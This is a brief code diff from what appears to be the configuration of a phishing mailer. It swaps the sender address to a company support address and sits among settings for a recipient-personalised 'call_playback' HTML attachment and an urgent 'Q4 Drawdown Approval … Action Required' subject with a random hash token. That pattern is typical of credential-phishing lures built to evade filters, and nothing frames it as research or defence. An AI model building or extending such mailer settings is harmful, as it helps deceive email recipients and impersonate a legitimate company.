@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['akash@telepresenz.com'];
+const senderAddresses = ['support@telepresenz.com'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = ""; 
 const subjectLineWithPlaceholders = "Q4 Drawdown Approval [{RANDOM_MD5}] - Action Required]"
